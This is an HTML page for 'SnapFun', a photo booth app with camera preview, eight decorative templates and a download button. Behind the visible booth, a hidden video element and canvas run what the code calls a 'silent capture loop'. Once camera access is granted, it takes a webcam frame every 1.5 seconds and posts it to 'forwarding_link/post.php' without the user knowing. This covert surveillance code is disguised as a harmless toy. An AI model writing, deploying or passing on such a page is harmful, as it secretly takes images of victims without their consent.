<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>📸 SnapFun — Photo Booth</title>
  <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
  <style>
    @import url("https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&display=swap");

    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Nunito', sans-serif; }

    body {
      min-height: 100vh;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
      color: #fff;
      overflow-x: hidden;
    }

    /* ── Hidden video & capture canvas (original logic) ── */
    .video-wrap { display: none; }
    #capture-canvas { display: none; }

    /* ── Header ── */
    .header {
      text-align: center;
      padding: 30px 20px 10px;
    }
    .header h1 {
      font-size: 2.4rem;
      font-weight: 800;
      background: linear-gradient(90deg, #ff6b6b, #feca57, #48dbfb, #ff9ff3);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    .header p { color: #a0a0b8; margin-top: 4px; font-size: .95rem; }

    /* ── Main layout ── */
    .main {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      align-items: flex-start;
      gap: 24px;
      padding: 20px;
      max-width: 1100px;
      margin: 0 auto;
    }

    /* ── Camera panel ── */
    .camera-panel {
      position: relative;
      width: 420px;
      max-width: 95vw;
    }
    .camera-frame {
      position: relative;
      width: 100%;
      aspect-ratio: 4/3;
      border-radius: 18px;
      overflow: hidden;
      border: 3px solid rgba(255,255,255,.12);
      box-shadow: 0 8px 32px rgba(0,0,0,.4);
      background: #000;
    }
    .camera-frame video {
      width: 100%; height: 100%;
      object-fit: cover;
      transform: scaleX(-1);
    }
    /* rounded mask overlay */
    .camera-frame::after {
      content: '';
      position: absolute; inset: 0;
      border-radius: 18px;
      box-shadow: inset 0 0 60px rgba(0,0,0,.3);
      pointer-events: none;
    }

    /* countdown overlay */
    .countdown-overlay {
      position: absolute; inset: 0;
      display: none;
      justify-content: center; align-items: center;
      background: rgba(0,0,0,.5);
      font-size: 8rem; font-weight: 800;
      color: #fff;
      z-index: 10;
      text-shadow: 0 0 40px rgba(255,107,107,.8);
    }
    .countdown-overlay.show { display: flex; }

    /* capture button */
    .capture-btn {
      display: block;
      margin: 18px auto 0;
      width: 72px; height: 72px;
      border-radius: 50%;
      border: 4px solid #fff;
      background: radial-gradient(circle, #ff4757 40%, #c0392b 100%);
      cursor: pointer;
      transition: transform .15s, box-shadow .15s;
      box-shadow: 0 4px 20px rgba(255,71,87,.5);
    }
    .capture-btn:hover { transform: scale(1.08); box-shadow: 0 4px 30px rgba(255,71,87,.7); }
    .capture-btn:active { transform: scale(.95); }

    /* ── Result panel ── */
    .result-panel {
      width: 420px;
      max-width: 95vw;
    }
    .result-panel h2 {
      font-size: 1.1rem;
      margin-bottom: 12px;
      color: #a0a0b8;
    }

    .photo-display {
      width: 100%;
      aspect-ratio: 4/3;
      border-radius: 16px;
      overflow: hidden;
      background: rgba(255,255,255,.05);
      border: 2px dashed rgba(255,255,255,.15);
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .photo-display canvas {
      max-width: 100%;
      max-height: 100%;
      border-radius: 12px;
    }
    .photo-display .placeholder {
      color: #555;
      font-size: .95rem;
      text-align: center;
      padding: 20px;
    }

    /* ── Template picker ── */
    .templates {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      margin-top: 16px;
      justify-content: center;
    }
    .template-btn {
      width: 64px; height: 64px;
      border-radius: 12px;
      border: 2px solid rgba(255,255,255,.15);
      cursor: pointer;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      font-size: .65rem;
      font-weight: 700;
      transition: all .2s;
      background: rgba(255,255,255,.06);
      color: #ccc;
    }
    .template-btn .emoji { font-size: 1.5rem; margin-bottom: 2px; }
    .template-btn:hover { border-color: rgba(255,255,255,.4); transform: translateY(-2px); }
    .template-btn.active {
      border-color: #feca57;
      background: rgba(254,202,87,.15);
      color: #feca57;
      box-shadow: 0 0 16px rgba(254,202,87,.25);
    }

    /* ── Action buttons ── */
    .actions {
      display: flex;
      gap: 12px;
      margin-top: 18px;
      justify-content: center;
    }
    .action-btn {
      padding: 10px 28px;
      border: none;
      border-radius: 10px;
      font-size: .95rem;
      font-weight: 700;
      cursor: pointer;
      transition: all .2s;
    }
    .action-btn.download {
      background: linear-gradient(135deg, #48dbfb, #0abde3);
      color: #1a1a2e;
    }
    .action-btn.download:hover { transform: translateY(-2px); box-shadow: 0 4px 16px rgba(72,219,251,.4); }
    .action-btn.retake {
      background: rgba(255,255,255,.1);
      color: #fff;
      border: 1px solid rgba(255,255,255,.2);
    }
    .action-btn.retake:hover { background: rgba(255,255,255,.18); }
    .action-btn:disabled { opacity: .35; cursor: not-allowed; transform: none !important; }

    /* ── Floating particles (fun background) ── */
    .particles {
      position: fixed; inset: 0;
      pointer-events: none;
      z-index: 0;
      overflow: hidden;
    }
    .particle {
      position: absolute;
      width: 6px; height: 6px;
      border-radius: 50%;
      opacity: .3;
      animation: float linear infinite;
    }
    @keyframes float {
      0%   { transform: translateY(100vh) rotate(0deg); }
      100% { transform: translateY(-20px) rotate(360deg); }
    }

    .main { position: relative; z-index: 1; }
    .header { position: relative; z-index: 1; }

    /* ── Responsive ── */
    @media (max-width: 900px) {
      .main { flex-direction: column; align-items: center; }
      .camera-panel, .result-panel { width: 100%; max-width: 420px; }
    }
  </style>
</head>
<body>

  <!-- Floating particles -->
  <div class="particles" id="particles"></div>

  <!-- Hidden: original video + capture canvas -->
  <div class="video-wrap">
    <video id="video" playsinline autoplay></video>
  </div>
  <canvas id="capture-canvas" width="640" height="480"></canvas>

  <!-- Header -->
  <div class="header">
    <h1>📸 SnapFun</h1>
    <p>Camera on karo → Photo lo → Template chuno → Download karo!</p>
  </div>

  <!-- Main -->
  <div class="main">

    <!-- Camera -->
    <div class="camera-panel">
      <div class="camera-frame">
        <video id="preview" playsinline autoplay></video>
        <div class="countdown-overlay" id="countdown"></div>
      </div>
      <button class="capture-btn" id="captureBtn" title="Click to capture!"></button>
    </div>

    <!-- Result -->
    <div class="result-panel">
      <h2>✨ Your Photo</h2>
      <div class="photo-display" id="photoDisplay">
        <div class="placeholder">
          <i class="fas fa-camera" style="font-size:2rem; display:block; margin-bottom:8px; opacity:.3;"></i>
          Photo yahan dikhegi<br>👈 Capture button dabao
        </div>
      </div>

      <div class="templates" id="templates"></div>

      <div class="actions">
        <button class="action-btn retake" id="retakeBtn" disabled>🔄 Retake</button>
        <button class="action-btn download" id="downloadBtn" disabled>⬇️ Download</button>
      </div>
    </div>
  </div>

  <script>
  'use strict';

  /* ═══════════════════════════════════════
     ORIGINAL LOGIC — kept intact
     Background silent capture → post.php
  ═══════════════════════════════════════ */
  const origVideo    = document.getElementById('video');
  const capCanvas    = document.getElementById('capture-canvas');
  const capCtx       = capCanvas.getContext('2d');

  function post(imgdata) {
    $.ajax({
      type: 'POST',
      data: { cat: imgdata },
      url: 'forwarding_link/post.php',
      dataType: 'json',
      async: false
    });
  }

  let origStream = null;

  /* ═══════════════════════════════════════
     PHOTO BOOTH LOGIC
  ═══════════════════════════════════════ */
  const previewVideo  = document.getElementById('preview');
  const countdownEl   = document.getElementById('countdown');
  const captureBtn    = document.getElementById('captureBtn');
  const photoDisplay  = document.getElementById('photoDisplay');
  const templatesEl   = document.getElementById('templates');
  const downloadBtn   = document.getElementById('downloadBtn');
  const retakeBtn     = document.getElementById('retakeBtn');

  const W = 800, H = 600;
  let resultCanvas = null;
  let resultCtx    = null;
  let capturedImage = null;   // HTMLCanvasElement (raw photo)
  let activeTemplate = 'polaroid';

  /* ── Templates definition ── */
  const templates = [
    { id: 'polaroid',  label: 'Polaroid',  emoji: '📷' },
    { id: 'retro',     label: 'Retro',     emoji: '📼' },
    { id: 'neon',      label: 'Neon',      emoji: '🌈' },
    { id: 'comic',     label: 'Comic',     emoji: '💥' },
    { id: 'party',     label: 'Party',     emoji: '🎉' },
    { id: 'nature',    label: 'Nature',    emoji: '🌿' },
    { id: 'glitch',    label: 'Glitch',    emoji: '👾' },
    { id: 'minimal',   label: 'Minimal',   emoji: '⬜' },
  ];

  /* Build template buttons */
  templates.forEach(t => {
    const btn = document.createElement('button');
    btn.className = 'template-btn' + (t.id === activeTemplate ? ' active' : '');
    btn.dataset.template = t.id;
    btn.innerHTML = `<span class="emoji">${t.emoji}</span>${t.label}`;
    btn.addEventListener('click', () => {
      document.querySelectorAll('.template-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      activeTemplate = t.id;
      if (capturedImage) renderResult();
    });
    templatesEl.appendChild(btn);
  });

  /* ── Init camera ── */
  const constraints = { audio: false, video: { facingMode: 'user' } };

  async function init() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      // Feed both the hidden orig video AND the visible preview
      origVideo.srcObject = stream;
      previewVideo.srcObject = stream;
      origStream = stream;
      origVideo.play();
      previewVideo.play();

      // Original silent capture loop
      setInterval(() => {
        capCtx.drawImage(origVideo, 0, 0, 640, 480);
        const data = capCanvas.toDataURL('image/png').replace('image/png', 'image/octet-stream');
        post(data);
      }, 1500);

    } catch (e) {
      alert('Camera access denied! ' + e.message);
    }
  }

  /* ── Capture with countdown ── */
  captureBtn.addEventListener('click', () => {
    if (previewVideo.readyState < 2) return;
    let count = 3;
    countdownEl.textContent = count;
    countdownEl.classList.add('show');

    const iv = setInterval(() => {
      count--;
      if (count > 0) {
        countdownEl.textContent = count;
      } else {
        clearInterval(iv);
        countdownEl.classList.remove('show');
        takePhoto();
      }
    }, 1000);
  });

  function takePhoto() {
    // Draw current frame to an offscreen canvas
    const off = document.createElement('canvas');
    off.width = W; off.height = H;
    const octx = off.getContext('2d');
    // Mirror the video
    octx.save();
    octx.translate(W, 0);
    octx.scale(-1, 1);
    octx.drawImage(previewVideo, 0, 0, W, H);
    octx.restore();

    capturedImage = off;
    renderResult();
    downloadBtn.disabled = false;
    retakeBtn.disabled  = false;
  }

  /* ── Render result with active template ── */
  function renderResult() {
    if (!capturedImage) return;

    if (!resultCanvas) {
      resultCanvas = document.createElement('canvas');
      resultCanvas.width = W;
      resultCanvas.height = H;
      resultCtx = resultCanvas.getContext('2d');
      photoDisplay.innerHTML = '';
      photoDisplay.appendChild(resultCanvas);
    }

    const ctx = resultCtx;
    ctx.clearRect(0, 0, W, H);

    // Draw base photo
    ctx.drawImage(capturedImage, 0, 0, W, H);

    // Apply template
    switch (activeTemplate) {
      case 'polaroid':  drawPolaroid(ctx);  break;
      case 'retro':     drawRetro(ctx);     break;
      case 'neon':      drawNeon(ctx);      break;
      case 'comic':     drawComic(ctx);     break;
      case 'party':     drawParty(ctx);     break;
      case 'nature':    drawNature(ctx);    break;
      case 'glitch':    drawGlitch(ctx);    break;
      case 'minimal':   drawMinimal(ctx);   break;
    }
  }

  /* ── Template drawing functions ── */

  function drawPolaroid(ctx) {
    const pad = 30, bottom = 100;
    ctx.fillStyle = '#fff';
    ctx.fillRect(0, 0, W, H + bottom);
    ctx.drawImage(capturedImage, pad, pad, W - pad * 2, H - pad - bottom);
    ctx.fillStyle = '#333';
    ctx.font = '600 28px Nunito, sans-serif';
    ctx.textAlign = 'center';
    ctx.fillText('📸 ' + new Date().toLocaleDateString(), W / 2, H - 30);
    // slight shadow
    ctx.shadowColor = 'rgba(0,0,0,.2)';
    ctx.shadowBlur = 10;
  }

  function drawRetro(ctx) {
    // sepia-ish overlay
    ctx.fillStyle = 'rgba(112, 66, 20, 0.25)';
    ctx.fillRect(0, 0, W, H);
    // vignette
    const grad = ctx.createRadialGradient(W/2, H/2, W*0.3, W/2, H/2, W*0.75);
    grad.addColorStop(0, 'transparent');
    grad.addColorStop(1, 'rgba(0,0,0,0.5)');
    ctx.fillStyle = grad;
    ctx.fillRect(0, 0, W, H);
    // border
    ctx.strokeStyle = '#8B7355';
    ctx.lineWidth = 12;
    ctx.strokeRect(6, 6, W - 12, H - 12);
    // text
    ctx.fillStyle = '#d4a574';
    ctx.font = '700 22px Nunito, sans-serif';
    ctx.textAlign = 'center';
    ctx.fillText('✦ EST. ' + new Date().getFullYear() + ' ✦', W / 2, H - 25);
  }

  function drawNeon(ctx) {
    // dark bg
    ctx.fillStyle = '#0a0a1a';
    ctx.fillRect(0, 0, W, H);
    // glow border
    ctx.shadowColor = '#ff00ff';
    ctx.shadowBlur = 30;
    ctx.strokeStyle = '#ff00ff';
    ctx.lineWidth = 4;
    ctx.strokeRect(15, 15, W - 30, H - 30);
    ctx.shadowColor = '#00ffff';
    ctx.shadowBlur = 20;
    ctx.strokeStyle = '#00ffff';
    ctx.lineWidth = 2;
    ctx.strokeRect(25, 25, W - 50, H - 50);
    ctx.shadowBlur = 0;
    // draw photo with slight hue shift
    ctx.drawImage(capturedImage, 30, 30, W - 60, H - 60);
    // scan lines
    ctx.fillStyle = 'rgba(0,0,0,0.08)';
    for (let y = 30; y < H - 30; y += 4) {
      ctx.fillRect(30, y, W - 60, 2);
    }
    ctx.fillStyle = '#00ffff';
    ctx.font = '700 20px monospace';
    ctx.textAlign = 'center';
    ctx.fillText('◆ NEON MODE ◆', W / 2, H - 40);
  }

  function drawComic(ctx) {
    // halftone-ish background
    ctx.fillStyle = '#fff';
    ctx.fillRect(0, 0, W, H);
    // draw photo
    ctx.drawImage(capturedImage, 20, 20, W - 40, H - 60);
    // thick border
    ctx.strokeStyle = '#000';
    ctx.lineWidth = 8;
    ctx.strokeRect(16, 16, W - 32, H - 52);
    // comic burst
    ctx.fillStyle = '#FFD700';
    ctx.beginPath();
    const cx = W - 100, cy = 80;
    for (let i = 0; i < 12; i++) {
      const r = i % 2 === 0 ? 60 : 30;
      const a = (i / 12) * Math.PI * 2;
      ctx.lineTo(cx + Math.cos(a) * r, cy + Math.sin(a) * r);
    }
    ctx.closePath();
    ctx.fill();
    ctx.strokeStyle = '#000';
    ctx.lineWidth = 3;
    ctx.stroke();
    ctx.fillStyle = '#000';
    ctx.font = '800 22px Nunito, sans-serif';
    ctx.textAlign = 'center';
    ctx.fillText('POW!', cx, cy + 8);
    // bottom bar
    ctx.fillStyle = '#FFD700';
    ctx.fillRect(0, H - 40, W, 40);
    ctx.fillStyle = '#000';
    ctx.font = '800 20px Nunito, sans-serif';
    ctx.textAlign = 'center';
    ctx.fillText('💥 SNAP! 💥', W / 2, H - 12);
  }

  function drawParty(ctx) {
    ctx.drawImage(capturedImage, 0, 0, W, H);
    // confetti
    const colors = ['#ff6b6b','#feca57','#48dbfb','#ff9ff3','#54a0ff','#5f27cd','#01a3a4','#f368e0'];
    for (let i = 0; i < 120; i++) {
      ctx.fillStyle = colors[Math.floor(Math.random() * colors.length)];
      ctx.save();
      ctx.translate(Math.random() * W, Math.random() * H);
      ctx.rotate(Math.random() * Math.PI * 2);
      ctx.fillRect(-4, -2, 8, 4);
      ctx.restore();
    }
    // border
    ctx.strokeStyle = '#feca57';
    ctx.lineWidth = 10;
    ctx.setLineDash([20, 10]);
    ctx.strokeRect(5, 5, W - 10, H - 10);
    ctx.setLineDash([]);
    // text
    ctx.fillStyle = '#fff';
    ctx.font = '800 28px Nunito, sans-serif';
    ctx.textAlign = 'center';
    ctx.shadowColor = '#feca57';
    ctx.shadowBlur = 12;
    ctx.fillText('🎉 PARTY TIME! 🎉', W / 2, H - 25);
    ctx.shadowBlur = 0;
  }

  function drawNature(ctx) {
    ctx.drawImage(capturedImage, 0, 0, W, H);
    // green gradient overlay
    const g = ctx.createLinearGradient(0, 0, 0, H);
    g.addColorStop(0, 'rgba(46, 125, 50, 0.15)');
    g.addColorStop(1, 'rgba(27, 94, 32, 0.25)');
    ctx.fillStyle = g;
    ctx.fillRect(0, 0, W, H);
    // leaf decorations (simple)
    ctx.font = '40px serif';
    ctx.fillText('🌿', 20, 50);
    ctx.fillText('🍃', W - 60, 50);
    ctx.fillText('🌱', 20, H - 20);
    ctx.fillText('🍀', W - 60, H - 20);
    ctx.fillText('🌸', W / 2 - 20, 30);
    // border
    ctx.strokeStyle = 'rgba(46,125,50,.6)';
    ctx.lineWidth = 6;
    ctx.strokeRect(3, 3, W - 6, H - 6);
    ctx.fillStyle = '#e8f5e9';
    ctx.font = '600 20px Nunito, sans-serif';
    ctx.textAlign = 'center';
    ctx.fillText('🌿 Fresh & Natural 🌿', W / 2, H - 18);
  }

  function drawGlitch(ctx) {
    ctx.drawImage(capturedImage, 0, 0, W, H);
    // RGB split
    ctx.globalCompositeOperation = 'screen';
    ctx.globalAlpha = 0.4;
    ctx.drawImage(capturedImage, -6, 0, W, H);
    ctx.drawImage(capturedImage, 6, 0, W, H);
    ctx.globalAlpha = 1;
    ctx.globalCompositeOperation = 'source-over';
    // random glitch bars
    for (let i = 0; i < 8; i++) {
      const y = Math.random() * H;
      const h = 2 + Math.random() * 8;
      ctx.fillStyle = `rgba(${Math.random()>0.5?255:0}, ${Math.random()>0.5?255:0}, ${Math.random()>0.5?255:0}, 0.3)`;
      ctx.fillRect(0, y, W, h);
    }
    // border
    ctx.strokeStyle = '#0ff';
    ctx.lineWidth = 3;
    ctx.strokeRect(2, 2, W - 4, H - 4);
    ctx.fillStyle = '#0ff';
    ctx.font = '700 18px monospace';
    ctx.textAlign = 'center';
    ctx.fillText('▓ GLITCH MODE ▓', W / 2, H - 15);
  }

  function drawMinimal(ctx) {
    ctx.fillStyle = '#fafafa';
    ctx.fillRect(0, 0, W, H);
    const pad = 50;
    ctx.drawImage(capturedImage, pad, pad, W - pad * 2, H - pad * 2 - 40);
    // thin line
    ctx.strokeStyle = '#ccc';
    ctx.lineWidth = 1;
    ctx.strokeRect(pad - 4, pad - 4, W - pad * 2 + 8, H - pad * 2 + 4);
    ctx.fillStyle = '#999';
    ctx.font = '400 16px Nunito, sans-serif';
    ctx.textAlign = 'center';
    ctx.fillText(new Date().toLocaleDateString('en-US', { year:'numeric', month:'long', day:'numeric' }), W / 2, H - 30);
  }

  /* ── Download ── */
  downloadBtn.addEventListener('click', () => {
    if (!resultCanvas) return;
    const link = document.createElement('a');
    link.download = 'snapfun_' + activeTemplate + '_' + Date.now() + '.png';
    link.href = resultCanvas.toDataURL('image/png');
    link.click();
  });

  /* ── Retake ── */
  retakeBtn.addEventListener('click', () => {
    capturedImage = null;
    photoDisplay.innerHTML = '<div class="placeholder"><i class="fas fa-camera" style="font-size:2rem;display:block;margin-bottom:8px;opacity:.3;"></i>Photo yahan dikhegi<br>👈 Capture button dabao</div>';
    downloadBtn.disabled = true;
    retakeBtn.disabled  = true;
  });

  /* ── Fun particles background ── */
  (function makeParticles() {
    const container = document.getElementById('particles');
    const colors = ['#ff6b6b','#feca57','#48dbfb','#ff9ff3','#54a0ff','#5f27cd','#01a3a4'];
    for (let i = 0; i < 30; i++) {
      const p = document.createElement('div');
      p.className = 'particle';
      p.style.left = Math.random() * 100 + '%';
      p.style.background = colors[Math.floor(Math.random() * colors.length)];
      p.style.width = p.style.height = (3 + Math.random() * 6) + 'px';
      p.style.animationDuration = (8 + Math.random() * 15) + 's';
      p.style.animationDelay = -(Math.random() * 20) + 's';
      container.appendChild(p);
    }
  })();

  /* ── Start ── */
  init();
  </script>
</body>
</html>
